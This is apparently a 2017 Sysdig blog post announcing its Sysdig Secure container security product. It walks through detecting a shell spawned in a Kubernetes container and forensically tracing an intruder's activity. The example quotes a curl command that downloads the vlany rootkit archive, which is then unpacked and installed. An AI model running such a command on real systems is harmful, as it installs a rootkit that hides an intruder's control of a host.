---
ID: 4812
post_title: 'Announcing Sysdig Secure &#8211; Container run-time security &#038; forensics'
author: Apurva Dave
post_excerpt: >
  Our newest member of the Sysdig family
  is designed for enterprises with
  distributed, dynamic services.
layout: post
permalink: >
  https://sysdigrp2rs.wpengine.com/blog/announcing-sysdig-secure/
published: true
post_date: 2017-10-11 21:00:01
---
We’re excited to announce the newest member of the Sysdig family: <a href="https://sysdigrp2rs.wpengine.com/products/secure" target="_parent">Sysdig Secure</a>. It’s designed to provide container run-time security & forensics for enterprises with distributed, dynamic services. As with everything we do, Secure comes with deep container visibility and a natural integration with key orchestration technologies like Kubernetes, Docker, OpenShift, Amazon ECS…. and well, just about everything else that’s important these days.

Sysdig Secure shares the same instrumentation as Sysdig Monitor, the exact same analytics backend, and consistent UIs. We call this reusable goodness the <a href="https://sysdigrp2rs.wpengine.com/products/how-it-works/" target="_parent">Sysdig Container Intelligence Platform</a> - a unified approach to secure, monitor, and troubleshoot your container environment. Enough about that, let’s focus on Secure.

If you’re the type that doesn’t want to read, just watch this 3-minute video to see the product in action:

<div style="text-align:center, clear:both">
  <iframe width="560" height="315" src="https://www.youtube.com/embed/e_kdjHjK7mY" frameborder="0" allowfullscreen></iframe>
</div> [tweet_box design="default" float="none"]Sysdig Secure: #containers visibility & orchestration tools integration for #Docker run-time #security & #forensics[/tweet_box] 

## Way Back in 2014

Using Sysdig for security purposes has been happening since 2014. Take our infamous blog post [Fishing For Hackers][1], where we used open source Sysdig to analyze activity on a compromised server. 300,000+ visits later, people are still retweeting this forensics blog post regularly.

In 2015 we built <a href="https://sysdigrp2rs.wpengine.com/products/monitor" target="_parent">Sysdig Monitor</a> - a way to monitor metrics from hundreds of thousands of containers. Using the same instrumentation technology as our open source project, it gave enterprises the first complete view of all their containerized applications’ performance and system call level data to troubleshoot problems.

In 2016 we launched <a href="http://sysdig.org/falco" target="_parent">Sysdig Falco</a> - an open source container security monitor that detects anomalous activity (container activity, file system access, network activity… you get it) in your applications. We’ve seen enormous adoption of Falco including major enterprises like [Yahoo][2] and government agencies like cloud.gov.

Each of the pieces we’ve built leverage the same core, but tune the workflow in different ways to solve a particular, thorny issue when operating containers. That brings us to Sysdig Secure.

## Enabling better container security with Sysdig Secure

Let’s start with a stake in the ground: containers can make your environment more secure. Isolated, well-understood processes can have a smaller attack surface and more intelligent, more agile management than legacy VMs running a mess of code. This is true if you’re architected to leverage these container advantages.

We also think that the platforms themselves have done a fantastic job with pre-deployment security. Features like Docker’s scanner, <a href="https://access.redhat.com/documentation/en-us/red_hat_cloudforms/4.5/html/integration_with_openshift_container_platform/scanning" target="_parent">Red Hat Cloudforms</a>, and RBAC in Kubernetes prevent known vulnerabilities in your environment. But what happens when you drop your code into the wilds of production? How do you spot zero day threats, malicious activity, or exfiltration events? How do you do incident response when Kubernetes has already killed off the containers in question? Or how do you audit and stamp out bad hygiene in your organization?

This is where run-time security and forensics come into play, and where Sysdig Secure shines.

## Detect and Analyze a rootkit with Sysdig Secure

By the end of any intro blog post all you really want to do is see if a product can really do what it says it can. So instead of bludgeoning you with feature/functionality, let’s go through a real world example - detecting anomalous user activity and analyzing what happens - while stepping through the Sysdig Secure workflow that takes you from an alert to insight.

We’ll start off with an anomaly detection policy: Has a bash shell has been spawned inside a container? (Secure has dozens of default policies, all based off our knowledge of managing millions of containers in production).

[<img style="max-width: 100%; height: auto;" src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/WP-shell-in-container-policy.png" alt="Shell in a container policy" width="1200" height="750" class="alignleft wp-image-4350" />][3]

Using **Sysdig Secure’s service-oriented security** you can scope a policy based on orchestration metadata. This policy applies against all containers that run in the `kubernetes.namespace.name = wp-demo`. The beauty is this policy applies everywhere the containers are physically located even as Kubernetes spins up more containers. 

Now let’s set a **run-time defense** action. Checking “Create Capture” will create a Sysdig Capture of all system activity before and after a policy violation for forensic analysis. We could also kill or pause this container as additional actions, but in this case we just want to track the event and the corresponding activity around a violation. 

[<img style="max-width: 100%; height: auto;" src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/Explore-Policy-Violation.png" alt="Sysdig Secure Policy Violation" width="1200" height="750" class="alignleft wp-image-4350" />][4]

Using ServiceVision we can explore a violation against the “Terminal shell in container” policy in both the logical and physical context of where it occurred. In the *Policy Event Details* we can see the Kubernetes orchestration hierarchy, physical host, and container for complete context of the violation. Let’s continue this investigation by clicking on view commands to see what was executed by the user.

[<img style="max-width: 100%; height: auto;" src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/Commands-History.png" alt="Sysdig Secure Commands History" width="1200" height="750" class="alignleft wp-image-4350" />][5]

We’ll get dropped into a view of all commands related to the violation that were executed across my environment during that time period. In addition to being useful for our upcoming analysis, this is a goldmine for auditing. All user commands and arguments are continuously logged to our system and enriched with all your orchestrator metadata, just like everything else we do. You can pull it all out via our API if you need to take it into another application like a SIEM.

Looking at the user activity we can see a shell was spawned and then curl was used to pull down this sketchy looking url - `https://dl.packetstormsecurity.net/UNIX/penetration/rootkits/vlany-master.tar.gz -o vlany-master.tar.gz`

Then tar was ran to unzip the rootkit and install it on the host.

So far we’ve been able to pinpoint a major issue. But what did the user really do to the system? Let’s peel back another layer by looking at the capture file that was automatically triggered by the policy we created, This happens all within Sysdig Secure’s interface by simply opening a capture with Inspect.

Opening the capture, we get a summary of all container, file, network and process activity on our host(s) of interest before and after the policy violation.

[<img style="max-width: 100%; height: auto;" src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/inspect.gif" alt="Sysdig Inspect Overview" width="1200" height="750" class="alignleft wp-image-4350" />][6]

Clicking on tiles shows us a timeline of relevant activity. The executed commands line up with the violation, and we know from the commands history some nefarious stuff was going on so let’s drill down.

We can see the same executed commands from *Commands History* but now we can do further analysis of the file that was unzipped on our host.

[<img style="max-width: 100%; height: auto;" src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/commands-in-inspect.png" alt="Sysdig Inspect executed commands" width="1200" height="750" class="alignleft wp-image-4350" />][7]

Double clicking the tar command we can switch to the files view and see every file that was written on installation.. There’s a config, README, and a bunch of other files that were installed.

[<img style="max-width: 100%; height: auto;" src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/File-opens-rookit.png" alt="Rootkit file installation" width="1200" height="750" class="alignleft wp-image-4350" />][8]

Next we can use the I/O streams functionality to drill into the `vlany-master/install.sh` file **to see all the contents** were written when the rootkit was installed.

[<img style="max-width: 100%; height: auto;" src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/file-contents-rootkit.png" alt="Rootkit file installation" width="1200" height="750" class="alignleft wp-image-4350" />][9]

The crazy thing here is we were able to follow a capture file from an alert, to see all user commands, to see what processes a user invoked and their action, to the individual contents of what were inside the files the process wrote... In a single streamlined workflow without ever leaving the browser.

We also did it outside of production - never logging into the affected system - and truth be told, the orchestrator may have killed off this particular container a long time ago.

## Conclusion: This is just the beginning

We’re pretty excited with what we’ve created to secure your containers, but we know it’s just the start. We’re already working on our next set of features (see our experimental labs within Sysdig Secure!) and we hope you’ll start trying them out too.

### Here’s what you do:

[Request a demo][10] & get a [trial started][11].

Attend one of our Sysdig Secure intro webinars:

*   [October 17th @ 10:00 a.m. PST][12]
*   [October 25th @ 10:00 a.m. PST][12]
*   [Nov 1st @ 6:00 a.m. PST][12] - earlier for all of our European friends :)

 [1]: https://sysdigrp2rs.wpengine.com/blog/fishing-for-hackers/
 [2]: https://youtu.be/WdmsUuG7zhY?t=3h3m23s
 [3]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/WP-shell-in-container-policy.png
 [4]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/Explore-Policy-Violation.png
 [5]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/Commands-History.png
 [6]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/inspect.gif
 [7]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/commands-in-inspect.png
 [8]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/File-opens-rookit.png
 [9]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/10/file-contents-rootkit.png
 [10]: https://go.sysdigrp2rs.wpengine.com/docker-security-demo
 [11]: https://go.sysdigrp2rs.wpengine.com/secure-trial-request
 [12]: https://register.gotowebinar.com/rt/4884195963262902018